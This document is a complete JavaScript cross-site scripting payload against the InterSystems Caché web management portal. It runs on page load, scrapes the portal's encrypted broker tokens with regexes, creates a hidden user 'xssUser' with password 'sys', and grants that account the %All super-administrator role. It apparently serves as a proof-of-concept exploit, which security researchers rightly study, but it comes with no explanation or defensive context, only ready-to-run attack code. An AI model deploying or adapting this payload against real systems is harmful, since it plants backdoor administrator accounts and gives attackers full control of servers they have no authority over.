//Function to modify new user to have super admin privs

<code><pre>getSystem = async (weventS, paramS, userName) => {
 const xhr = new XMLHttpRequest();
 xhr.open("POST", "/csp/sys/sec/%25CSP.Broker.cls", true);
 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 xhr.send("WARGC=10&WEVENT=" + weventS + "&WARG_1=54&WARG_2=AssignRoles&WARG_3=VARCHAR&WARG_4=1&WARG_5=%25CSP.UI.Portal.User%01%25ZEN.Component.vgroup%01%25ZEN.Component.pane%01%25CSP.UI.Component.UserRoles%041%011%01%042%019%01%043%0110%01%042%0153%01%044%0154%01&WARG_6=843974696%011%01%01%01%01%010%01%01System%20Administration%2CSecurity%2CUsers%2CEdit%20User%010%010%010%011%01%01Edit%20User%016%01%01" + userName + "%01%2Fcsp%2Fsys%2Fsec%2F%2525CSP.UI.Portal.Users.zen%011%01%25ZEN.SVGComponent.tabBar%2C%25CSP.UI.Portal.User%01Edit%20User%01%01There%20was%20a%20problem%20with%20the%20form.%20See%20the%20highlighted%20fields%20below.%01_CSP.UI.Portal.About.zen%01%01%011000%01%01%01%01top%01-1%01%013%01name%011%01columns%010%010%011%010%011%010%01zendiv%01%01%01page%01%01100%25%010%01%01zenHint%01%01%01%2Fcsp%2Fsys%2F%2525CSP.Portal.Home.zen%3F%24NAMESPACE%3D%2525SYS%010%010%010%01%01zenLabel%01zenLabelDisabled%01top%01%010%01" + paramS + "%01Edit%20User%0186%01%01%01%01%01%01%01%01%01%01%010%010%01%010%01%011%01%01%23(%25page.StdTitle)%23%01%011%011%01%011%01100%25%010%042521056755%019%01%01%011%01%01%01%01%01%01%01%01-1%01%010%010%010%010%01zendiv%01%01%01group%01%01%010%01%01zenHint%01%01%01zenLabel%01zenLabelDisabled%01top%01%01" + paramS + "%01%01%01%01%01%01%01%01%01%010%010%011%01%01%01%01top%011%01100%25%043306517082%0110%01%01%019%01%01%01%01%01%01%01top%01-1%01padding%3A10px%010%010%010%010%01zendiv%01%01%01group%01%01%010%01%01zenHint%01%01%01zenLabel%01zenLabelDisabled%01top%01%01" + paramS + "%01%01%01%01%01%01%01%01%01%010%01contentPane%010%011%01%01%01%01%011%01100%25%042521056755%0153%01page_2%01%0110%01%01%01%01%01%01%01%01-1%01%010%010%010%010%01zendiv%01padding-left%3A10px%3Bpadding-top%3A20px%3B%01%01group%01%01%010%01%01zenHint%01%01%01zenLabel%01zenLabelDisabled%01top%01%01" + paramS + "%01%01%01%01%01%01%01%01%01%010%010%011%01%01%01%01%011%01%043855861879%0154%01UserRoles%01%0153%01%01%23(%25page.PID)%23%01%01%01avaList%01%010%010%010%01zendiv%01%01%01%010%01%01zenHint%01%01%01zenLabel%01zenLabelDisabled%01%01%01%01%01%01%01%01%01%010%010%010%01selList%011%01%01%01%01UserRole%01%011%01&WARG_7=L%2CL%2CB%2CL&WARG_8=%23(%25page.PID)%23%04%25All%040%04UserRole&WARG_9=%25SYS&WARG_10=9");
}

//Function to obtain encrypted strings required to modify user roles
getLayout = async (userName) => {
 const xhr = new XMLHttpRequest();
 xhr.onreadystatechange = async () => {
   if (xhr.readyState === 4 && xhr.status === 200) {
     document.innerHTML = xhr.responseText;

        //Pull the required wevent encrypted string Regex :/
        const response = 
xhr.responseText.match(/zenInstanceMethod\(object([\s\S]{1300})/);
        const regexSet1 = /cspHttpServerMethod([\s\S]{111})/
        const regexSet2 = /"((?:\\.|[^"\\])*)"/
        const modifyResponse = regexSet1.exec(response);
        const regString = regexSet2.exec(modifyResponse).shift();
        const encString = regString.replace(/['"]+/g, '')

        // Pulls the required encrypted string passed in the arg
        const response2 = xhr.responseText.match(/(o.layout\s=\s'[\s\S]{25})/);
        const regexSet3 = /'((?:\\.|[^'\\])*)'/
        const rString = regexSet3.exec(response2).shift();
        const eString = rString.replace(/['']+/g, '')

        getSystem(encString, eString, userName);

   }
 };
 xhr.open("GET", "/csp/sys/sec/%25CSP.UI.Portal.User.zen?PID=" + userName, true);
 xhr.send();
}

// Function to create a new user in the Cache dashboard
newUser = async (brokerString) => {
 const xhr = new XMLHttpRequest();
 xhr.open("POST", "/csp/sys/sec/%25CSP.Broker.cls", true);
 xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
 // Username and password to create
 const uName = "xssUser";
 const pass = "sys";
 // Sends payload to the Broker event handler
 xhr.send("WARGC=10&WEVENT=" + brokerString +"&WARG_1=%25CSP.UI.Portal.User&WARG_2=SaveData&WARG_3=HANDLE&WARG_4=1&WARG_5=%25ZEN.proxyObject%041%01-1%01&WARG_6=%25ZEN.proxyObject%01-1%01PID%05%01Name%05" + uName + "%01FullName%05%01Comment%05%01Password%05" + pass + "%01ChangePassword%050%01PasswordNeverExpires%050%01Enabled%051%01ExpirationDate%05%01AccountNeverExpires%050%01AutheTwoFactorSMS%050%01AutheTwoFactorPW%050%01HOTPKeyDisplay%050%01NameSpace%05%01Routine%05%01EmailAddress%05%01PhoneProvider%05%01PhoneNumber%05%01passwordChoice%050%01CopyUser%05&WARG_7=O&WARG_8=-1&WARG_9=%25SYS&WARG_10=12");
 getLayout(uName);
}

// Function to obtain the wevent encrypted string to be passed
getBroker = async () => {
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = async () => {
   if (xhr.readyState === 4 && xhr.status === 200) {
     document.innerHTML = xhr.responseText;
        //Pull the required wevent encrypted string
        const response = 
xhr.responseText.match(/.cspHttpServerMethod*([\s\S]*),object/);
        const regex = /"((?:\\.|[^"\\])*)"/
        const regString = regex.exec(response).shift();
        const encString = regString.replace(/['"]+/g, '');
        newUser(encString);
   }
 };
 xhr.open("GET", "/csp/sys/sec/%25CSP.UI.Portal.User.zen?PID=", true);
 xhr.send();
}

onload=getBroker()</pre></code>
